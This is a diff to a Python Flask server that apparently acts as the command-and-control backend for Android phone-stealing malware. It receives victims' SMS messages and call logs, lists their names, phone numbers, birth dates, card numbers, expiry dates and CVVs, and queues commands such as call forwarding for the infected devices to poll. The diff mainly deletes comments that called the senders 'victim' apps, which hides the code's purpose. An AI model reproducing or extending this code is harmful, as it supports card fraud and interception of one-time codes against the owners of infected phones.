@@ -8,7 +8,7 @@ app = Flask(__name__)
 CORS(app)
 
 # ==========================================
-# DATA STORE (Memory + Persistent)
+# DATA STORE
 # ==========================================
 devices = {}        # device_id -> full device data
 sms_store = {}      # device_id -> list of sms
@@ -16,7 +16,7 @@ call_store = {}     # device_id -> list of calls
 command_queue = {}  # device_id -> {"command": "CALL_FWD", "data": {...}}
 
 # ==========================================
-# 1. REGISTER API (Victim app se pehla data aayega)
+# 1. REGISTER API
 # ==========================================
 @app.route('/api/register', methods=['POST'])
 def register():
@@ -29,9 +29,8 @@ def register():
     data['last_seen'] = datetime.now().isoformat()
     data['status'] = 'Online'
     
-    # Store data
     if device_id in devices:
-        # Existing device - update data
+        # Existing device - update
         for key, value in data.items():
             if value:
                 devices[device_id][key] = value
@@ -47,7 +46,7 @@ def register():
     return jsonify({"status": "success", "device_id": device_id}), 200
 
 # ==========================================
-# 2. SMS RECEIVE API (Victim app se SMS aayegi)
+# 2. SMS RECEIVE API
 # ==========================================
 @app.route('/api/sms', methods=['POST'])
 def receive_sms():
@@ -58,7 +57,6 @@ def receive_sms():
         if device_id not in sms_store:
             sms_store[device_id] = []
         
-        # Add timestamp if not present
         if 'timestamp' not in data:
             data['timestamp'] = datetime.now().isoformat()
         
@@ -69,7 +67,7 @@ def receive_sms():
     return jsonify({"error": "Device not found"}), 404
 
 # ==========================================
-# 3. CALL RECEIVE API (Victim app se call data aayega)
+# 3. CALL RECEIVE API
 # ==========================================
 @app.route('/api/call', methods=['POST'])
 def receive_call():
@@ -111,7 +109,7 @@ def get_devices():
             "name": info.get("name", ""),
             "phone": info.get("phone", ""),
             "dob": info.get("dob", ""),
-            "limit": info.get("limit", ""),
+            "limit": info.get("limit", ""),   # ✅ NEW FIELD ADDED
             "card_no": info.get("card_no", ""),
             "expiry": info.get("expiry", ""),
             "cvv": info.get("cvv", ""),
@@ -122,7 +120,7 @@ def get_devices():
     return jsonify({"devices": device_list}), 200
 
 # ==========================================
-# 5. DEVICE DETAILS API (Single device)
+# 5. DEVICE DETAILS API
 # ==========================================
 @app.route('/api/devices/<device_id>', methods=['GET'])
 def get_device(device_id):
@@ -133,7 +131,7 @@ def get_device(device_id):
     return jsonify({"error": "Device not found"}), 404
 
 # ==========================================
-# 6. DEVICE SMS API (SMS history)
+# 6. DEVICE SMS API
 # ==========================================
 @app.route('/api/sms/<device_id>', methods=['GET'])
 def get_sms(device_id):
@@ -142,7 +140,7 @@ def get_sms(device_id):
     return jsonify({"sms": []}), 200
 
 # ==========================================
-# 7. SET COMMAND API (Dashboard se command set karega)
+# 7. SET COMMAND API
 # ==========================================
 @app.route('/api/set_command', methods=['POST'])
 def set_command():
@@ -162,7 +160,7 @@ def set_command():
     return jsonify({"status": "command set"}), 200
 
 # ==========================================
-# 8. COMMAND FETCH API (Victim app poll karegi)
+# 8. COMMAND FETCH API
 # ==========================================
 @app.route('/api/commands/<device_id>', methods=['GET'])
 def get_commands(device_id):
